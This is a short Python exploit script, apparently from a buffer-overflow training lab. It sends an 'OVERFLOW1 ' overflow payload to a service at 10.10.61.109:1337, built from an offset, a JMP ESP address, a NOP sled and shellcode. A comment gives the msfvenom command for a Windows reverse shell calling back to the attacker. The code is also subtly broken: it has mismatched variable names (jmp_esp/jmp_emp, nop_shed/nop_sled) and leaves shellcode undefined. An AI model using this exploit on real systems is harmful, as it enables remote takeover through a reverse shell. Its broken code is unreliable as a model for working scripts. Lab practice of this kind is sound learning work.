#!/usr/bin/python3
import socket
import struct
#import pwn import p32 

def p32(data):
    return struct.pack("<I", data)

host, port = "10.10.61.109", 1337

# shellcode = msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b $badchars -f py -v shellcode

cmd = b"OVERFLOW1 "
pattern_length = 2000 # Documentation and keep for length retention
offset = 1978
new_eip = b"BBBB"
jmp_esp = p32(0x625011AF) # must be the correct endianness
nop_shed = b"\x90" * 24 # multiple of 4

payload = b"".join([
            cmd,
            b"A" * offset,
            jmp_emp,            
            nop_sled,
            shellcode,
            b"C" *  (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
        ])

with socket.socket() as s:
    
    s.connect((host,port))
    s.send(payload)

